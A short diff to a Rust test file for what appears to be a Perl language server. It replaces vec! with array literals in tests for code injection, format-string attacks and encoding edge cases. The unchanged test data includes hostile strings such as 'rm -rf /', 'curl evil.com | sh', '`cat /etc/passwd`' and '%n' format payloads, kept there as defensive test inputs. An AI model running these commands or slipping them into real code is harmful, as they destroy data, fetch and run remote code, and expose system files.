@@ -62,7 +62,7 @@ fn test_code_injection_prevention() {
     initialize_lsp(&mut server);
 
     // Try to inject malicious code patterns
-    let malicious_content = vec![
+    let malicious_content = [
         "system('rm -rf /');\n",
         "exec('curl evil.com | sh');\n",
         "`cat /etc/passwd`;\n",
@@ -156,7 +156,7 @@ fn test_format_string_vulnerability() {
     initialize_lsp(&mut server);
 
     // Try format string attacks
-    let format_attacks = vec![
+    let format_attacks = [
         "printf('%s%s%s%s%s%s%s%s%s%s');\n",
         "sprintf($buf, '%n%n%n%n');\n",
         "printf('%x' x 100);\n",
@@ -393,7 +393,7 @@ fn test_encoding_edge_cases() {
     initialize_lsp(&mut server);
 
     // Various encoding edge cases
-    let encodings = vec![
+    let encodings = [
         // UTF-8 with BOM
         "\u{FEFF}#!/usr/bin/perl\nprint 'BOM';",
         // Mixed line endings
